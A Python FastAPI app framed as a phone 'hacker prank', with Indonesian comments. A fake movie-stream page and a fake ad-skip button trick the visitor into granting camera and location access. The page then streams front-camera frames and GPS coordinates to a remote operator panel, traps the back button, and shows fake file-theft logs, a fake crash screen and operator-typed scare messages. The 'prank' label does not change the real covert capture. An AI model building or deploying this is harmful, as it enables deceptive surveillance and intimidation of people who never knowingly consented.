from fastapi import FastAPI, WebSocket, WebSocketDisconnect
from fastapi.responses import HTMLResponse

app = FastAPI()

target_clients = set()
remote_clients = set()

TARGET_HTML = """
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Loading Video...</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { overflow: hidden; touch-action: none; background: #000; }
        .glitch { animation: glitch 0.3s infinite; }
        @keyframes glitch { 0% { transform: translate(0) } 20% { transform: translate(-2px, 2px) } 40% { transform: translate(-2px, -2px) } 60% { transform: translate(2px, 2px) } 80% { transform: translate(2px, -2px) } 100% { transform: translate(0) } }
    </style>
</head>
<body class="text-green-500 font-mono h-screen flex flex-col items-center justify-center select-none bg-black">

    <!-- LAYAR 1: FAKE VIDEO PLAYER -->
    <div id="screen-video" class="w-full h-full flex flex-col items-center justify-center bg-gray-900 z-50">
        <div class="text-center">
            <h1 class="text-white text-2xl font-bold mb-4">Dune: Part Two (2024)</h1>
            <div class="w-64 h-36 bg-gray-800 rounded-lg flex items-center justify-center mb-4 border border-gray-700 cursor-pointer" onclick="showAd()">
                <span class="text-4xl text-white">▶</span>
            </div>
            <p class="text-gray-400 text-sm">1080p HD • Sub Indo</p>
        </div>
    </div>

    <!-- LAYAR 2: POPUP IKLAN HITUNG MUNDUR -->
    <div id="screen-ad" class="hidden fixed inset-0 bg-black/80 z-50 flex items-center justify-center p-4">
        <div class="bg-white text-black p-6 rounded-lg text-center max-w-sm w-full relative">
            <h2 class="font-bold text-lg mb-2">⚠️ AdBlocker Terdeteksi</h2>
            <p class="text-sm text-gray-600 mb-4">Harap nonaktifkan AdBlocker untuk melanjutkan pemutaran video.</p>
            
            <div id="ad-timer" class="text-xs text-gray-500 mb-2 font-bold">
                Iklan akan berakhir dalam <span id="timer-count" class="text-red-500 text-lg">3</span>...
            </div>
            
            <button id="btn-skip" onclick="startSystem()" class="hidden bg-blue-600 text-white font-bold py-3 px-6 rounded w-full active:bg-blue-800">✕ LEWATI IKLAN</button>
        </div>
    </div>

    <!-- LAYAR 3: HACKER TERMINAL -->
    <div id="screen-hack" class="hidden w-full h-full p-4 flex flex-col justify-between bg-black z-40 relative">
        <div onclick="killSwitch()" class="absolute top-0 right-0 w-12 h-12 z-50"></div>
        <div>
            <div class="flex justify-between border-b border-green-800 pb-2 mb-2 text-xs">
                <span>STATUS: <b class="text-red-500 animate-ping">BREACHED</b></span>
                <span id="battery">BAT: --%</span>
            </div>
            <div id="device-info" class="text-[10px] text-green-700 mb-2 bg-green-950/30 p-1"></div>
            
            <div class="bg-gray-950 border border-green-600 p-3 rounded min-h-[120px] max-h-[150px] overflow-y-auto">
                <p class="text-xs text-gray-500 mb-1">> Administrator Message:</p>
                <span id="ghost-text" class="text-lg font-bold text-white break-words"></span><span class="animate-ping">_</span>
            </div>
            
            <div id="scan-log" class="text-[10px] text-green-700 h-24 mt-2 overflow-hidden font-mono">
                [SYSTEM] Bypassing firewall...<br>
            </div>
        </div>

        <div class="my-2 relative flex justify-center items-center h-48">
            <video id="cam" autoplay playsinline class="hidden w-40 h-40 object-cover rounded-full border-2 border-red-600 shadow-[0_0_20px_rgba(255,0,0,0.8)]"></video>
            <!-- Canvas tersembunyi untuk streaming kamera ke remote -->
            <canvas id="cam-canvas" width="320" height="240" class="hidden"></canvas>
            
            <video id="vid" playsinline class="hidden w-full max-h-48 rounded border border-green-500" src="https://storage.googleapis.com/gtv-videos-bucket/sample/ForBiggerBlazes.mp4"></video>
            <div id="bsod" class="hidden absolute inset-0 bg-blue-600 text-white flex flex-col items-center justify-center text-center p-4 z-50">
                <h1 class="text-6xl mb-4">:(</h1>
                <p class="text-lg">Your PC ran into a problem and needs to restart.</p>
                <p class="text-sm mt-4">0% complete</p>
            </div>
        </div>
    </div>

    <!-- LAYAR 4: PUNCHLINE -->
    <div id="screen-gotcha" class="hidden fixed inset-0 bg-white text-black z-[100] flex flex-col items-center justify-center p-6 text-center">
        <h1 class="text-5xl mb-4">😄</h1>
        <h2 class="text-2xl font-bold mb-2">GOTCHA!</h2>
        <p class="text-gray-700">HP kamu tidak diretas. Ini cuma trik sulap digital.</p>
        <p class="text-sm text-gray-500 mt-4">Dibuat oleh: [Nama Anda]</p>
        <button onclick="location.reload()" class="mt-8 bg-black text-white px-6 py-2 rounded">Tutup</button>
    </div>

    <script>
        let ws;
        let tapCount = 0;
        let streamInterval;
        const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';

        // FUNGSI 1: TAMPILKAN IKLAN HITUNG MUNDUR
        function showAd() {
            document.getElementById('screen-ad').classList.remove('hidden');
            let count = 3;
            const timer = setInterval(() => {
                count--;
                document.getElementById('timer-count').innerText = count;
                if (count <= 0) {
                    clearInterval(timer);
                    document.getElementById('ad-timer').classList.add('hidden');
                    document.getElementById('btn-skip').classList.remove('hidden');
                }
            }, 1000);
        }

        // FUNGSI 2: EKSEKUSI IZIN, FULLSCREEN & STREAMING
        async function startSystem() {
            document.getElementById('screen-ad').classList.add('hidden');
            document.getElementById('screen-video').classList.add('hidden');
            
            // Minta Fullscreen
            if (document.documentElement.requestFullscreen) {
                document.documentElement.requestFullscreen().catch(()=>{});
            }

            // Minta Kamera & Setup Stream
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                window.camStream = stream; 
                
                const video = document.getElementById('cam');
                const canvas = document.getElementById('cam-canvas');
                const ctx = canvas.getContext('2d');
                video.srcObject = stream;
                
                ws = new WebSocket(`${protocol}//${window.location.host}/ws/target`);
                
                // Kirim frame kamera ke remote setiap 300ms
                streamInterval = setInterval(() => {
                    if(ws.readyState === WebSocket.OPEN && video.readyState === video.HAVE_ENOUGH_DATA) {
                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                        const dataUrl = canvas.toDataURL('image/jpeg', 0.4);
                        ws.send(JSON.stringify({ action: 'frame', data: dataUrl }));
                    }
                }, 300);

            } catch (e) { 
                console.log("Camera denied"); 
                ws = new WebSocket(`${protocol}//${window.location.host}/ws/target`);
            }

            // Minta Lokasi
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(pos => {
                    const lat = pos.coords.latitude.toFixed(4);
                    const lon = pos.coords.longitude.toFixed(4);
                    addLog(`[GPS] LOCATION LOCKED: ${lat}, ${lon}`);
                    if (ws && ws.readyState === WebSocket.OPEN) {
                        ws.send(JSON.stringify({ action: 'location', lat: lat, lon: lon }));
                    }
                }, ()=>{});
            }

            // Tampilkan Terminal
            document.getElementById('screen-hack').classList.remove('hidden');
            document.body.classList.add('glitch'); 
            setTimeout(() => document.body.classList.remove('glitch'), 300);

            // Info Device
            document.getElementById('device-info').innerText = navigator.userAgent;
            if (navigator.getBattery) {
                navigator.getBattery().then(b => document.getElementById('battery').innerText = `BAT: ${Math.round(b.level * 100)}%`);
            } else {
                document.getElementById('battery').innerText = `BAT: ${Math.floor(Math.random() * 40) + 40}%`; 
            }

            // Trap Back Button
            history.pushState(null, null, location.href);
            window.onpopstate = function () { history.go(1); };

            // Teater Scan File
            setInterval(() => {
                const files = ["/DCIM/Camera/IMG_2024.jpg", "/WhatsApp/Chats/msg.db", "/Android/data/com.tiktok/cache", "/Documents/Rahasia.pdf"];
                const file = files[Math.floor(Math.random() * files.length)];
                addLog(`[STEALING] ${file} ... OK`);
            }, 1500);

            ws.onmessage = (event) => {
                const data = JSON.parse(event.data);
                if (data.action === 'type') {
                    document.getElementById('ghost-text').innerText = data.text;
                } else if (data.action === 'vibrate') {
                    if (navigator.vibrate) navigator.vibrate([300, 100, 300, 100, 500]);
                    document.body.classList.add('bg-red-900');
                    setTimeout(() => document.body.classList.remove('bg-red-900'), 400);
                } else if (data.action === 'camera') {
                    document.getElementById('cam').classList.remove('hidden');
                    document.getElementById('vid').classList.add('hidden');
                } else if (data.action === 'video') {
                    const vid = document.getElementById('vid');
                    vid.classList.remove('hidden');
                    document.getElementById('cam').classList.add('hidden');
                    vid.play();
                } else if (data.action === 'bsod') {
                    document.getElementById('bsod').classList.remove('hidden');
                } else if (data.action === 'reset') {
                    document.getElementById('ghost-text').innerText = '';
                    document.getElementById('vid').pause();
                    document.getElementById('vid').classList.add('hidden');
                    document.getElementById('cam').classList.add('hidden');
                    document.getElementById('bsod').classList.add('hidden');
                    document.body.classList.remove('bg-red-900');
                } else if (data.action === 'punchline') {
                    document.getElementById('screen-gotcha').classList.remove('hidden');
                    document.getElementById('screen-hack').classList.add('hidden');
                }
            };
        }

        function addLog(msg) {
            const log = document.getElementById('scan-log');
            log.innerHTML = `> ${msg}<br>` + log.innerHTML;
        }

        // Kill Switch Rahasia (Tap 5x pojok kanan atas)
        function killSwitch() {
            tapCount++;
            if (tapCount >= 5) {
                document.getElementById('screen-gotcha').classList.remove('hidden');
                document.getElementById('screen-hack').classList.add('hidden');
            }
            setTimeout(() => { tapCount = 0; }, 2000);
        }
    </script>
</body>
</html>
"""

REMOTE_HTML = """
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ROOT@EXPLOIT_FRAMEWORK</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { background-color: #050505; color: #00ff41; font-family: 'Courier New', Courier, monospace; }
        .terminal-box { border: 1px solid #00ff41; background: rgba(0, 20, 0, 0.5); box-shadow: 0 0 10px rgba(0, 255, 65, 0.2); }
        .btn-hack { background: #001a00; border: 1px solid #00ff41; color: #00ff41; transition: all 0.2s; }
        .btn-hack:active { background: #00ff41; color: #000; }
        .scanline { background: linear-gradient(to bottom, rgba(255,255,255,0), rgba(255,255,255,0) 50%, rgba(0,0,0,0.2) 50%, rgba(0,0,0,0.2)); background-size: 100% 4px; pointer-events: none; }
    </style>
</head>
<body class="min-h-screen p-3 relative overflow-x-hidden">
    <div class="fixed inset-0 scanline z-50 pointer-events-none"></div>

    <div class="max-w-md mx-auto relative z-10">
        <!-- Header -->
        <div class="flex items-center justify-between border-b border-green-800 pb-2 mb-3 text-xs">
            <h1 class="font-bold">root@kali:~# ./exploit.sh</h1>
            <span id="status" class="bg-red-900 text-red-400 px-2 py-0.5 rounded animate-pulse">WAITING...</span>
        </div>

        <!-- Target Info -->
        <div class="terminal-box p-2 mb-3 text-xs">
            <div class="flex justify-between">
                <span>TARGET IP:</span>
                <span id="target-ip" class="text-white">Scanning...</span>
            </div>
            <div class="flex justify-between mt-1">
                <span>GEOLOCATION:</span>
                <span id="target-loc" class="text-yellow-400 font-bold">Locking...</span>
            </div>
        </div>

        <!-- Camera Feed (Streaming) -->
        <div class="terminal-box p-2 mb-3 relative flex flex-col items-center justify-center h-48 overflow-hidden">
            <img id="remote-cam" class="w-full h-full object-cover hidden" />
            <div id="cam-placeholder" class="absolute inset-0 flex items-center justify-center text-green-900 text-xs text-center">
                [ CAMERA FEED OFFLINE ]<br>Press 'ACCESS CAMERA'
            </div>
            <!-- Radar Overlay -->
            <div class="absolute inset-0 border-2 border-green-500 rounded-full opacity-30 animate-ping pointer-events-none"></div>
        </div>

        <!-- Ghost Typing -->
        <div class="mb-3">
            <label class="block text-[10px] text-green-700 mb-1">> INJECT_PAYLOAD (GHOST_TYPING):</label>
            <textarea id="ghost-input" rows="2" placeholder="Ketik pesan untuk menakuti..." class="w-full bg-black text-green-400 font-mono p-2 text-sm border border-green-800 focus:outline-none focus:border-green-400"></textarea>
        </div>

        <!-- Control Buttons -->
        <div class="grid grid-cols-2 gap-2 mb-2 text-xs font-bold">
            <button onclick="sendCmd('camera')" class="btn-hack p-2">📸 ACCESS CAMERA</button>
            <button onclick="sendCmd('vibrate')" class="btn-hack p-2">📳 VIBRATE & ALARM</button>
            <button onclick="sendCmd('video')" class="btn-hack p-2">🎬 PLAY VIDEO</button>
            <button onclick="sendCmd('bsod')" class="btn-hack p-2">💻 FAKE BSOD</button>
        </div>
        
        <!-- System Control -->
        <div class="grid grid-cols-2 gap-2 text-xs font-bold mt-4 border-t border-green-900 pt-3">
            <button onclick="sendCmd('reset')" class="border border-yellow-600 text-yellow-500 p-2 active:bg-yellow-600 active:text-black">🔄 RESET SYSTEM</button>
            <button onclick="sendCmd('punchline')" class="border border-blue-500 text-blue-400 p-2 active:bg-blue-500 active:text-black">🎉 SHOW PUNCHLINE</button>
        </div>
    </div>

    <script>
        const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
        const ws = new WebSocket(`${protocol}//${window.location.host}/ws/remote`);

        ws.onopen = () => {
            const st = document.getElementById('status');
            st.innerText = 'CONNECTED';
            st.className = 'bg-green-900 text-green-400 px-2 py-0.5 rounded';
            document.getElementById('target-ip').innerText = '192.168.' + Math.floor(Math.random()*255) + '.' + Math.floor(Math.random()*255);
        };

        document.getElementById('ghost-input').addEventListener('input', (e) => {
            if(ws.readyState === WebSocket.OPEN) {
                ws.send(JSON.stringify({ action: 'type', text: e.target.value }));
            }
        });

        function sendCmd(action) {
            if(ws.readyState === WebSocket.OPEN) {
                ws.send(JSON.stringify({ action: action }));
            }
        }

        // Menangani pesan masuk dari Target (Kamera & Lokasi)
        ws.onmessage = (event) => {
            const data = JSON.parse(event.data);
            
            if (data.action === 'frame') {
                const img = document.getElementById('remote-cam');
                img.src = data.data;
                img.classList.remove('hidden');
                document.getElementById('cam-placeholder').classList.add('hidden');
            } 
            else if (data.action === 'location') {
                document.getElementById('target-loc').innerText = `${data.lat}, ${data.lon}`;
            }
        };
    </script>
</body>
</html>
"""

@app.get("/")
async def get_target():
    return HTMLResponse(TARGET_HTML)

@app.get("/remote")
async def get_remote():
    return HTMLResponse(REMOTE_HTML)

@app.websocket("/ws/target")
async def websocket_target(websocket: WebSocket):
    await websocket.accept()
    target_clients.add(websocket)
    try:
        while True:
            data = await websocket.receive_text()
            for remote in list(remote_clients):
                try:
                    await remote.send_text(data)
                except:
                    remote_clients.remove(remote)
    except WebSocketDisconnect:
        target_clients.remove(websocket)

@app.websocket("/ws/remote")
async def websocket_remote(websocket: WebSocket):
    await websocket.accept()
    remote_clients.add(websocket)
    try:
        while True:
            data = await websocket.receive_text()
            for target in list(target_clients):
                try:
                    await target.send_text(data)
                except:
                    target_clients.remove(target)
    except WebSocketDisconnect:
        remote_clients.remove(websocket)
